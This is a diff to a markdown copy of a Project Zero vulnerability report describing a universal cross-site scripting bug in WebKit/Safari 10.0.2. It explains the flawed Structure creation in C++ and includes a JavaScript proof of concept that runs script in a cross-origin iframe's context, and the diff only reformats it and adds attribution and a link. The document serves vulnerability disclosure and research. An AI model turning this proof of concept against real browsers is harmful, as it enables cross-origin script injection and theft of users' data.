@@ -1,8 +1,11 @@
 # UXSS via PrototypeMap::createEmptyStructure
 
+### Reported by lokihardt@google.com, Jan 17 2017
+
 When creating an object in Javascript, its `Structure` is created with the constructor's prototype's `VM`.
 
 Here's some snippets of that routine.
+
 ```cpp
 Structure* InternalFunction::createSubclassStructure(ExecState* exec, JSValue newTarget, Structure* baseClass)
 {
@@ -40,18 +43,21 @@ As we can see `Structure::create` is called with prototype's `vm` and `globalObj
 Tested on Safari 10.0.2(12602.3.12.0.1) and Webkit Nightly 10.0.2(12602.3.12.0.1, r210800).
 
 Poc:
+
 ```js
-let f = document.body.appendChild(document.createElement('iframe'));
-  f.onload = () => {
-      f.onload = null;
+let f = document.body.appendChild(document.createElement('iframe'))
+f.onload = () => {
+	f.onload = null
 
-      let g = function () {};
-      g.prototype = f.contentWindow;
+	let g = function() {}
+	g.prototype = f.contentWindow
 
-      let a = Reflect.construct(Function, ['return window[0].eval;'], g);
-      let e = a();
-      e('alert(location)');
-  };
+	let a = Reflect.construct(Function, ['return window[0].eval;'], g)
+	let e = a()
+	e('alert(location)')
+}
 
-  f.src = 'https://abc.xyz/';
+f.src = 'https://abc.xyz/'
 ```
+
+Link: https://bugs.chromium.org/p/project-zero/issues/detail?id=1084
